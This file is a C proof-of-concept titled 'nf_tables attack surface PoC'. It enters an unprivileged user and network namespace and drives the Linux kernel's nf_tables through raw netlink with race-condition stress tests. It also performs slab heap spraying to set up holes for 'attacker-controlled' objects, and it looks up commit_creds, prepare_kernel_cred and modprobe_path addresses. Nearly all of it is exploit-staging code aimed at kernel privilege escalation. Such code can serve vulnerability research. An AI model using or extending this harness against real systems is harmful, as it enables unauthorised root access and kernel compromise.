/*
 * nft_poc.c — nf_tables attack surface PoC (raw netlink, no libnftnl)
 *
 * Exploit path:
 *   unshare(CLONE_NEWUSER|CLONE_NEWNET) → CAP_NET_ADMIN in isolated ns
 *   → full nf_tables control plane via NFNL_SUBSYS_NFTABLES
 *
 * Tests:
 *   1. pipapo GC race (COW + GC timer concurrent pressure)
 *   2. rbtree set abort path (transaction abort cleanup)
 *   3. dynset 1ms timeout — GC re-add race
 *   4. Concurrent transactions (two netlink sockets)
 *   5. Heap spray — slab state manipulation
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>

/* ─── Raw netlink infrastructure ─────────────────────────────────────────── */

#define BUF_SZ  (256 * 1024)
#define NFT_MSG(t) ((NFNL_SUBSYS_NFTABLES << 8) | (t))

typedef struct { char *buf; int cap; int pos; } nbuf;

static void nbuf_reset(nbuf *b) { b->pos = 0; }

static struct nlmsghdr *nb_op(nbuf *b, uint16_t type, uint16_t flags,
                               uint32_t seq, int family) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)(b->buf + b->pos);
    struct nfgenmsg  *nfg = (struct nfgenmsg *)(nlh + 1);
    memset(nlh, 0, NLMSG_HDRLEN + sizeof(*nfg));
    nlh->nlmsg_type  = type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nfg->nfgen_family = (uint8_t)family;
    nlh->nlmsg_len   = NLMSG_ALIGN(NLMSG_HDRLEN + sizeof(*nfg));
    return nlh;
}

static struct nlmsghdr *nb_batch(nbuf *b, uint16_t type, uint32_t seq) {
    struct nlmsghdr *nlh = nb_op(b, type, 0, seq, AF_UNSPEC);
    struct nfgenmsg *nfg = (struct nfgenmsg *)(nlh + 1);
    uint16_t rid = __builtin_bswap16(NFNL_SUBSYS_NFTABLES);
    memcpy(&nfg->res_id, &rid, 2);
    return nlh;
}

static void nb_end(nbuf *b, struct nlmsghdr *nlh) {
    b->pos += NLMSG_ALIGN(nlh->nlmsg_len);
}

static void nb_str(struct nlmsghdr *nlh, uint16_t type, const char *s) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    int slen = strlen(s) + 1;
    a->nla_type = type;
    a->nla_len  = NLA_HDRLEN + slen;
    memcpy((char *)a + NLA_HDRLEN, s, slen);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}

static void nb_u32(struct nlmsghdr *nlh, uint16_t type, uint32_t v) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = type;
    a->nla_len  = NLA_HDRLEN + 4;
    uint32_t be = __builtin_bswap32(v);
    memcpy((char *)a + NLA_HDRLEN, &be, 4);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}

static void nb_u64(struct nlmsghdr *nlh, uint16_t type, uint64_t v) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = type;
    a->nla_len  = NLA_HDRLEN + 8;
    uint64_t be = __builtin_bswap64(v);
    memcpy((char *)a + NLA_HDRLEN, &be, 8);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}

static struct nlattr *nb_nest_begin(struct nlmsghdr *nlh, uint16_t type) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = NLA_F_NESTED | type;
    a->nla_len  = NLA_HDRLEN;
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
    return a;
}

static void nb_nest_end(struct nlmsghdr *nlh, struct nlattr *a) {
    a->nla_len = (char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)a;
}

/* ─── Netlink socket ─────────────────────────────────────────────────────── */

static int nl_sock = -1;
static uint32_t nl_seq = 0;

static int nl_open(void) {
    nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nl_sock < 0) { perror("socket"); return -1; }
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    if (bind(nl_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return -1;
    }
    return 0;
}

/* Send batch buffer and drain all responses.
 * Returns 0 on success, negative errno on kernel error. */
static int nl_send_drain(nbuf *b) {
    int fd = nl_sock;
    int ret = send(fd, b->buf, b->pos, 0);
    nbuf_reset(b);
    if (ret < 0) return -errno;

    /* set non-blocking for recv loop */
    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    char rbuf[32768];
    int last_err = 0;
    struct pollfd pfd = { .fd = fd, .events = POLLIN };
    while (poll(&pfd, 1, 20) > 0) {
        ret = recv(fd, rbuf, sizeof(rbuf), 0);
        if (ret <= 0) break;
        struct nlmsghdr *nlh = (struct nlmsghdr *)rbuf;
        int sz = ret;
        while (NLMSG_OK(nlh, (unsigned)sz)) {
            if (nlh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)(nlh + 1);
                if (e->error) last_err = e->error;
            }
            nlh = NLMSG_NEXT(nlh, sz);
        }
    }
    fcntl(fd, F_SETFL, flags); /* restore blocking */
    return last_err;
}

/* ─── nf_tables helpers ──────────────────────────────────────────────────── */

static char _buf[BUF_SZ];
static nbuf NB = { .buf = _buf, .cap = BUF_SZ, .pos = 0 };

static int nft_add_table(const char *name) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWTABLE),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_TABLE_NAME, name);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

static int nft_del_table(const char *name) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELTABLE),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_TABLE_NAME, name);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

static int nft_add_set(const char *table, const char *sname,
                        uint32_t flags, uint64_t timeout_ms) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSET),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_TABLE,    table);
    nb_str(nlh, NFTA_SET_NAME,     sname);
    nb_u32(nlh, NFTA_SET_FLAGS,    flags);  /* REQUIRED even if 0 */
    nb_u32(nlh, NFTA_SET_KEY_TYPE, 7);      /* TYPE_IPADDR */
    nb_u32(nlh, NFTA_SET_KEY_LEN,  4);
    nb_u32(nlh, NFTA_SET_ID,       1);
    if (timeout_ms)
        nb_u64(nlh, NFTA_SET_TIMEOUT, timeout_ms);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

static int nft_del_set(const char *table, const char *sname) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELSET),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_TABLE, table);
    nb_str(nlh, NFTA_SET_NAME,  sname);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/* Add N point elements (hash/timeout/rbtree sets) */
static int nft_add_elems(const char *table, const char *sname,
                          uint32_t *ips_be, int n, uint64_t timeout_ms) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));

    for (int i = 0; i < n; i++) {
        struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSETELEM),
                                     NLM_F_CREATE, ++nl_seq, AF_INET);
        nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
        nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);
        struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
          struct nlattr *elem = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            struct nlattr *key = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
              nb_u32(nlh, NFTA_DATA_VALUE, ips_be[i]);
            nb_nest_end(nlh, key);
            if (timeout_ms)
                nb_u64(nlh, NFTA_SET_ELEM_TIMEOUT, timeout_ms);
          nb_nest_end(nlh, elem);
        nb_nest_end(nlh, list);
        nb_end(&NB, nlh);
    }

    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/*
 * Add N /32 interval elements (pipapo NFT_SET_INTERVAL sets).
 *
 * Wire format (from capture of real nft binary):
 *   pipapo uses "interval-end pair" encoding, NOT NFTA_SET_ELEM_KEY_END.
 *   For each IP X, two elements per entry in ELEMENTS list:
 *     elem A: key=X,   no NFTA_SET_ELEM_FLAGS (start of interval)
 *     elem B: key=X+1, NFTA_SET_ELEM_FLAGS=NFT_SET_ELEM_INTERVAL_END=0x1
 *
 *   Both elements are nested inside a single NFTA_SET_ELEM_LIST_ELEMENTS.
 *   Sequential nla_type indices (1,2,3,...) are used for elements in the
 *   list; kernel iterates all regardless of type (nla_for_each_nested).
 *
 * This function sends all n IPs plus the 0.0.0.0 sentinel in one batch.
 */
static int nft_add_interval_elems(const char *table, const char *sname,
                                   uint32_t *ips_be, int n,
                                   uint64_t timeout_ms) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));

    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSETELEM),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
    nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);

    struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);

    /* sentinel: 0.0.0.0 INTERVAL_END — anchors the beginning of address space */
    struct nlattr *sent = nb_nest_begin(nlh, NFTA_LIST_ELEM);
      nb_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_INTERVAL_END);
      struct nlattr *sk = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
        nb_u32(nlh, NFTA_DATA_VALUE, 0); /* 0.0.0.0 */
      nb_nest_end(nlh, sk);
    nb_nest_end(nlh, sent);

    for (int i = 0; i < n; i++) {
        uint32_t start = ips_be[i];
        uint32_t end1  = __builtin_bswap32(__builtin_bswap32(ips_be[i]) + 1);

        /* start element: key=X, no flags */
        struct nlattr *ea = nb_nest_begin(nlh, NFTA_LIST_ELEM);
          struct nlattr *ka = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, start);
          nb_nest_end(nlh, ka);
          if (timeout_ms)
              nb_u64(nlh, NFTA_SET_ELEM_TIMEOUT, timeout_ms);
        nb_nest_end(nlh, ea);

        /* end element: key=X+1, FLAGS=INTERVAL_END */
        struct nlattr *eb = nb_nest_begin(nlh, NFTA_LIST_ELEM);
          nb_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_INTERVAL_END);
          struct nlattr *kb = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, end1);
          nb_nest_end(nlh, kb);
        nb_nest_end(nlh, eb);
    }

    nb_nest_end(nlh, list);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

static int nft_del_elem(const char *table, const char *sname, uint32_t ip_be) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELSETELEM),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
    nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);
    struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
      struct nlattr *elem = nb_nest_begin(nlh, NFTA_LIST_ELEM);
        struct nlattr *key = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
          nb_u32(nlh, NFTA_DATA_VALUE, ip_be);
        nb_nest_end(nlh, key);
      nb_nest_end(nlh, elem);
    nb_nest_end(nlh, list);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/* ─── KASLR: read from /proc/kallsyms (root only) ───────────────────────── */

static unsigned long sym(const char *name) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    unsigned long a = 0; char t; char n[256];
    while (fscanf(f, "%lx %c %255s\n", &a, &t, n) == 3)
        if (!strcmp(n, name)) { fclose(f); return a; }
    fclose(f);
    return 0;
}

/* ─── TEST 1: pipapo GC race ─────────────────────────────────────────────── */

static void test_pipapo_gc_race(void) {
    printf("\n[TEST 1] pipapo GC race — rapid interval element churn under timeout\n");
    const char *T = "pgc", *S = "iset";

    int r;
    r = nft_add_table(T);
    printf("  add table: %s\n", r ? strerror(-r) : "OK");

    /* pipapo backend: NFT_SET_INTERVAL + NFT_SET_TIMEOUT */
    r = nft_add_set(T, S, NFT_SET_INTERVAL | NFT_SET_TIMEOUT, 50);
    printf("  create pipapo+timeout set (50ms): %s\n", r ? strerror(-r) : "OK");
    if (r) { nft_del_table(T); return; }

    /*
     * Interval elements need KEY (start) + KEY_END (end).
     * For /32 point entries: start == end.
     * Stress: add 64 /32s, wait 60ms (> 50ms timeout → GC fires on expired
     * elements), then delete explicitly to force pipapo COW clone while GC
     * may still hold a ref to the old match structure.
     */
    /* probe: single /32 element using correct pair encoding */
    {
        uint32_t probe_ip = __builtin_bswap32(0x0a000001);
        int probe = nft_add_interval_elems(T, S, &probe_ip, 1, 0);
        printf("  probe single /32 10.0.0.1 (no timeout): %s\n",
               probe ? strerror(-probe) : "OK");
        nft_del_elem(T, S, probe_ip);
    }

    int added = 0, errs = 0;
    for (int chunk = 0; chunk < 8; chunk++) {
        uint32_t ips[64];
        for (int j = 0; j < 64; j++)
            ips[j] = __builtin_bswap32(0x0a000001 + chunk * 64 + j);
        int r2 = nft_add_interval_elems(T, S, ips, 64, 50);
        if (r2 == 0) added += 64;
        else {
            errs += 64;
            if (chunk == 0) printf("  chunk0 error: %s\n", strerror(-r2));
        }

        usleep(60000); /* 60ms > timeout → GC fires on expiring elems */

        for (int j = 0; j < 64; j++)
            nft_del_elem(T, S, ips[j]);
    }
    printf("  interval add/del churn: %d added, %d errors\n", added, errs);
    printf("  [!] check dmesg for KASAN/KFENCE BUG reports\n");

    nft_del_table(T);
}

/* ─── TEST 2: rbtree set — abort path ───────────────────────────────────── */

static void test_rbtree_abort(void) {
    printf("\n[TEST 2] rbtree set — transaction abort with partial element state\n");
    const char *T = "rbt", *S = "rbset";

    nft_add_table(T);
    int r = nft_add_set(T, S, 0, 0);
    printf("  create plain set: %s\n", r ? strerror(-r) : "OK");
    if (r) { nft_del_table(T); return; }

    /* populate 1024 entries — pushes kernel toward rbtree backend */
    int added = 0;
    uint32_t bulk[128];
    for (int chunk = 0; chunk < 8; chunk++) {
        for (int j = 0; j < 128; j++)
            bulk[j] = __builtin_bswap32(0xc0a80001 + chunk * 128 + j);
        if (nft_add_elems(T, S, bulk, 128, 0) == 0) added += 128;
    }
    printf("  populated %d elements\n", added);

    /* force duplicate → transaction abort (NLM_F_EXCL rejects existing elems) */
    uint32_t dup = __builtin_bswap32(0xc0a80001);
    /* temporarily force NLM_F_EXCL via a direct batch */
    {
        nbuf_reset(&NB);
        nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
        struct nlmsghdr *nlh2 = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSETELEM),
                                      NLM_F_CREATE | NLM_F_EXCL, ++nl_seq, AF_INET);
        nb_str(nlh2, NFTA_SET_ELEM_LIST_TABLE, T);
        nb_str(nlh2, NFTA_SET_ELEM_LIST_SET,   S);
        struct nlattr *lst = nb_nest_begin(nlh2, NFTA_SET_ELEM_LIST_ELEMENTS);
          struct nlattr *el  = nb_nest_begin(nlh2, NFTA_LIST_ELEM);
            struct nlattr *k   = nb_nest_begin(nlh2, NFTA_SET_ELEM_KEY);
              nb_u32(nlh2, NFTA_DATA_VALUE, dup);
            nb_nest_end(nlh2, k);
          nb_nest_end(nlh2, el);
        nb_nest_end(nlh2, lst);
        nb_end(&NB, nlh2);
        nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
        r = nl_send_drain(&NB);
    }
    printf("  dup insert (NLM_F_EXCL) result: %s (want -EEXIST)\n", strerror(-r));

    /* rapid churn to stress abort cleanup path */
    int ab = 0;
    for (int i = 0; i < 256; i++) {
        uint32_t ip = __builtin_bswap32(0xc0a80001 + (i % 1024));
        if (nft_add_elems(T, S, &ip, 1, 0) < 0) ab++;
    }
    printf("  abort-inducing ops: %d\n", ab);
    printf("  [!] check dmesg for KASAN/KFENCE BUG reports\n");

    nft_del_table(T);
}

/* ─── TEST 3: dynset 1ms timeout → GC re-add race ───────────────────────── */

static void test_dynset_timeout(void) {
    printf("\n[TEST 3] dynset NFT_SET_EVAL + 1ms timeout — GC re-add race\n");
    const char *T = "dyn", *S = "dset";

    nft_add_table(T);
    int r = nft_add_set(T, S, NFT_SET_EVAL | NFT_SET_TIMEOUT, 1);
    printf("  create dynset (1ms timeout): %s\n", r ? strerror(-r) : "OK");
    if (r) { nft_del_table(T); return; }

    uint32_t ips[256];
    for (int i = 0; i < 256; i++)
        ips[i] = __builtin_bswap32(0x01010101 + i);

    int added_r = nft_add_elems(T, S, ips, 256, 1);
    printf("  batch-add 256 elements (1ms each): %s\n",
           added_r ? strerror(-added_r) : "OK");

    usleep(5000); /* 5ms → all expired */

    int readd = nft_add_elems(T, S, ips, 256, 1);
    printf("  re-add after expiry: %s\n", readd ? strerror(-readd) : "OK");
    if (readd == -EEXIST)
        printf("  [!!] -EEXIST after timeout expiry → GC not running!\n");
    if (readd == 0)
        printf("  [OK] re-add succeeded — elements correctly expired\n");

    nft_del_table(T);
}

/* ─── TEST 4: concurrent transactions ───────────────────────────────────── */

static volatile int t4_stop = 0;
static const char *T4 = "conc";

/*
 * Worker uses its own separate netlink socket and buffer so it doesn't
 * corrupt the main thread's globals.  Both threads submit concurrent
 * transactions to the SAME kernel table — exercising nfnl_lock contention
 * and any races in the deferred GC / call_rcu paths.
 */
static void *t4_worker(void *arg) {
    (void)arg;

    int wsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (wsock < 0) return NULL;
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    bind(wsock, (struct sockaddr *)&addr, sizeof(addr));

    /* local buffer — no contention with main thread's NB */
    static __thread char wbuf[BUF_SZ];
    nbuf WB = { .buf = wbuf, .cap = BUF_SZ, .pos = 0 };

    uint32_t wseq = 1000;

    for (int i = 0; !t4_stop && i < 100; i++) {
        char name[32];
        snprintf(name, sizeof(name), "wset_%d", i % 8);

        /* NEWSET */
        nbuf_reset(&WB);
        nb_end(&WB, nb_batch(&WB, NFNL_MSG_BATCH_BEGIN, 0));
        struct nlmsghdr *nlh = nb_op(&WB, NFT_MSG(NFT_MSG_NEWSET),
                                     NLM_F_CREATE, ++wseq, AF_INET);
        nb_str(nlh, NFTA_SET_TABLE, T4);
        nb_str(nlh, NFTA_SET_NAME,  name);
        nb_u32(nlh, NFTA_SET_FLAGS, 0);
        nb_u32(nlh, NFTA_SET_KEY_TYPE, 7);
        nb_u32(nlh, NFTA_SET_KEY_LEN,  4);
        nb_u32(nlh, NFTA_SET_ID, 1);
        nb_end(&WB, nlh);
        nb_end(&WB, nb_batch(&WB, NFNL_MSG_BATCH_END, 0));
        send(wsock, WB.buf, WB.pos, 0);

        /* DELSET */
        nbuf_reset(&WB);
        nb_end(&WB, nb_batch(&WB, NFNL_MSG_BATCH_BEGIN, 0));
        nlh = nb_op(&WB, NFT_MSG(NFT_MSG_DELSET), 0, ++wseq, AF_INET);
        nb_str(nlh, NFTA_SET_TABLE, T4);
        nb_str(nlh, NFTA_SET_NAME,  name);
        nb_end(&WB, nlh);
        nb_end(&WB, nb_batch(&WB, NFNL_MSG_BATCH_END, 0));
        send(wsock, WB.buf, WB.pos, 0);
    }

    close(wsock);
    return NULL;
}

static void test_concurrent(void) {
    printf("\n[TEST 4] concurrent transactions — two netlink sockets\n");
    nft_add_table(T4);

    pthread_t wt;
    pthread_create(&wt, NULL, t4_worker, NULL);

    for (int i = 0; i < 100; i++) {
        char name[32];
        snprintf(name, sizeof(name), "mset_%d", i % 4);
        nft_add_set(T4, name, 0, 0);
        uint32_t ips[8];
        for (int j = 0; j < 8; j++)
            ips[j] = __builtin_bswap32(0x7f000001 + i * 8 + j);
        nft_add_elems(T4, name, ips, 8, 0);
    }

    t4_stop = 1;
    pthread_join(wt, NULL);
    printf("  concurrent test complete — check dmesg for anomalies\n");
    nft_del_table(T4);
}

/* ─── TEST 5: heap spray ─────────────────────────────────────────────────── */

static void test_heap_spray(void) {
    printf("\n[TEST 5] heap spray — slab allocation control\n");
    /*
     * nft_set size on x86_64 6.18 ≈ 312 bytes (→ kmalloc-512).
     * Long names push allocation into larger slabs.
     * Pattern: allocate many → free every-other → trigger vuln → fill holes.
     */
    const char *T = "spray";
    nft_add_table(T);

    int ok = 0;
    for (int i = 0; i < 64; i++) {
        char name[48];
        snprintf(name, sizeof(name), "s%03d%.*s",
                 i, (i % 4) * 6, "AAAAAAAAAAAAAAAAAAAAAA");
        if (nft_add_set(T, name, 0, 0) == 0) ok++;
    }
    printf("  sprayed %d sets (slab massage)\n", ok);

    int freed = 0;
    for (int i = 0; i < 64; i += 2) {
        char name[48];
        snprintf(name, sizeof(name), "s%03d%.*s",
                 i, (i % 4) * 6, "AAAAAAAAAAAAAAAAAAAAAA");
        if (nft_del_set(T, name) == 0) freed++;
    }
    printf("  freed %d sets — holes in slab ready\n", freed);
    printf("  [exploit] trigger vuln → allocate attacker-controlled object into holes\n");

    nft_del_table(T);
}

/* ─── main ───────────────────────────────────────────────────────────────── */

int main(void) {
    printf("=== nf_tables Attack Surface PoC ===\n");
    printf("=== Kernel 6.18.5 | Ubuntu 24.04  ===\n\n");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[!] unshare"); return 1;
    }
    printf("[+] user+net namespace: unprivileged attacker context\n");

    if (nl_open() < 0) return 1;
    printf("[+] raw netlink socket open\n");

    printf("\n[KASLR — root only via /proc/kallsyms]\n");
    printf("  commit_creds        = %#lx\n", sym("commit_creds"));
    printf("  prepare_kernel_cred = %#lx\n", sym("prepare_kernel_cred"));
    printf("  modprobe_path       = %#lx\n", sym("modprobe_path"));
    printf("  _stext (base)       = %#lx\n", sym("_stext"));

    test_pipapo_gc_race();
    test_rbtree_abort();
    test_dynset_timeout();
    test_concurrent();
    test_heap_spray();

    printf("\n[SUMMARY]\n");
    printf("  dmesg | grep -E 'BUG:|KASAN|KFENCE|WARNING:' — kernel anomalies\n");
    printf("  cat /proc/slabinfo | grep nft                 — slab state\n");
    return 0;
}
